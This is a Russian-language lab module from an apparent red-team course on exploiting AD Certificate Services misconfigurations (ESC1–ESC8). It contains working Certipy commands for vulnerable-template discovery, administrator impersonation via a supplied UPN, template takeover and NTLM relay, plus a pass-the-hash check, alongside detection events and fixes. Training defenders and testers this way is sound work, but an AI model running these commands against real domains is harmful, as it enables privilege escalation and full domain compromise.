# 11.5 — ADCS: ESC1–ESC8

> **M11 · Этап 2 · 6 ч · 🔴 · артефакт:** `labs/m11-ad-attacks/l05-adcs/`

## Цель

Научиться находить и эксплуатировать ошибки конфигурации Active Directory Certificate Services — один из самых прибыльных векторов современного red team.

## Результат

- `Certipy find` с разбором уязвимых шаблонов.
- Рабочий ESC1 и, как минимум, один из ESC4/ESC8.
- Понимание фиксов и детекта.

## Теория

### 1. Почему ADCS

Сертификат — это credential. Если шаблон позволяет запросить сертификат с произвольным `SAN` и подписью от CA, можно стать любым пользователем, включая DA. Ошибки типовые, а инструмент — `Certipy`.

### 2. Сценарии

| ID | Суть | Условие |
|---|---|---|
| ESC1 | шаблон позволяет `ENROLLEE_SUPPLIES_SUBJECT` + client auth | запись в шаблон/Enroll для low-priv |
| ESC2 | шаблон с `Any Purpose`/без EKU | enrollment |
| ESC3 | enrollment agent | шаблон агента + цель |
| ESC4 | запись в шаблон | `GenericAll`/`WriteDACL` на шаблоне |
| ESC5 | права на объекты PKI (CA, NTAuth) | ACL |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` на CA | флаг CA |
| ESC7 | права на CA (Manage CA/Issue) | роль |
| ESC8 | NTLM relay на HTTP enrollment | web enrollment + relay |

### 3. Certipy

```bash
certipy find -u alice@lab.local -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable -stdout
```

Флаг `-vulnerable` покажет только потенциально опасное. Читайте вывод: имя шаблона, права, EKU, SAN.

### 4. ESC1

```bash
certipy req -u alice@lab.local -p 'Password123!' -ca LAB-CA -template VulnTemplate \
  -upn administrator@lab.local -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

Ожидаемо: TGT и/или NTLM-хэш администратора.

### 5. ESC8

Поднимаем relay на HTTP enrollment:

```bash
certipy relay -ca 10.10.10.10 -template DomainController
```

Плюс принудительная аутентификация (PrinterBug/PetitPotam) — только в лабе. Затем `certipy auth` по полученному `.pfx`.

### 6. Детект и фикс

- 4886/4887 — запрос и выдача сертификата.
- 4768/4769 после `certipy auth`.
- Аномальный `SAN` в запросе.
- Фикс: убрать `ENROLLEE_SUPPLIES_SUBJECT` там, где не нужно; approval для чувствительных шаблонов; аудит ACL шаблонов и CA; отключить web enrollment; `StrongCertificateBindingEnforcement`; мониторинг ESC-паттернов.

## Лаборатория

> В лабе развёрнут `LAB-CA` на `DC01`, шаблон `VulnTemplate` (ESC1), шаблон с write-правами (ESC4) и HTTP enrollment (ESC8).

### 1. Discovery

```bash
certipy find -u alice@lab.local -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable -stdout
```

Ожидаемо: `VulnTemplate` с ESC1.

### 2. ESC1

```bash
certipy req -u alice@lab.local -p 'Password123!' -ca LAB-CA -template VulnTemplate \
  -upn administrator@lab.local -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

Ожидаемо: `Got hash for 'administrator@lab.local'`.

### 3. Проверка

```bash
nxc smb 10.10.10.10 -u administrator -H <hash> --shares
```

Ожидаемо: доступ к `C$`/`ADMIN$`.

### 4. ESC4

Если `alice` имеет `WriteDACL` на шаблоне:

```bash
certipy template -u alice@lab.local -p 'Password123!' -template VulnTemplate2 -save-old
```

Certipy меняет шаблон на уязвимый, затем `req` как в ESC1. После — восстановите шаблон.

### 5. ESC8 (опционально)

```bash
certipy relay -ca 10.10.10.10 -template DomainController
# в другом терминале — принудительная аутентификация в лабе
```

Ожидаемо: `.pfx` DC. Разберите, почему relay возможен.

### 6. События

```powershell
Get-WinEvent -LogName Security -MaxEvents 1000 |
  Where-Object Id -in 4886,4887,4768 |
  Select-Object TimeCreated,Id,Message
```

## Атака и защита

- **Атака:** уязвимый шаблон → сертификат как DA → TGT/хэш.
- **Детект:** 4886/4887, аномальный SAN, запросы к enrollment из необычных сегментов.
- **Фикс:** шаблоны без `SUPPLIES_SUBJECT`, approval, аудит ACL, отключение web enrollment, патчи, мониторинг.

## Самопроверка

- [ ] Чем ESC1 отличается от ESC4?
- [ ] Почему SAN делает сертификат «ключом» к другому пользователю?
- [ ] Что нужно для ESC8?
- [ ] Какие события показывают выдачу сертификата?
- [ ] Почему `certipy find -vulnerable` может пропустить проблему?

## Дальше

[11.6 — Trusts и тикеты](l06-trusts-tickets.md)
